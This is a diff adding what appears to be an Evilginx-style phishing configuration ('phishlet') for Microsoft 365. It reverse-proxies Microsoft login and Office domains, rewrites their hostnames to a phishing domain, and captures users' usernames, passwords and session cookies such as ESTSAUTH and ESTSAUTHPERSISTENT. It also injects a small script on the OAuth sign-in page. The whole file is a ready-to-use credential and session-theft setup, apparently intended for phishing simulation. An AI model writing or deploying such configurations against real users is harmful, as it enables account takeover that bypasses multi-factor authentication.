@@ -1,0 +1,57 @@
+name: 'microsoft365'
+author: 'gophish-labs'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'office.com', session: true, is_landing: false}
+
+sub_filters:
+  - triggers_on: ['login.microsoftonline.com']
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: 'login.microsoftonline.com'
+    replace: '{domain}'
+    mimes: ['text/html', 'application/json', 'application/javascript']
+
+  - triggers_on: ['www.office.com']
+    orig_sub: 'www'
+    domain: 'office.com'
+    search: 'www.office.com'
+    replace: '{domain}'
+    mimes: ['text/html', 'application/json']
+
+auth_tokens:
+  - domain: '.office.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+
+  - domain: '.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  url: '/'
+
+js_inject:
+  - trigger_domains: ['login.microsoftonline.com']
+    trigger_paths: ['/common/oauth2/authorize']
+    script: |
+      // Capture additional form data
+      (function() {
+        var forms = document.getElementsByTagName('form');
+        for(var i = 0; i < forms.length; i++) {
+          forms[i].addEventListener('submit', function(e) {
+            console.log('Form submitted');
+          });
+        }
+      })();
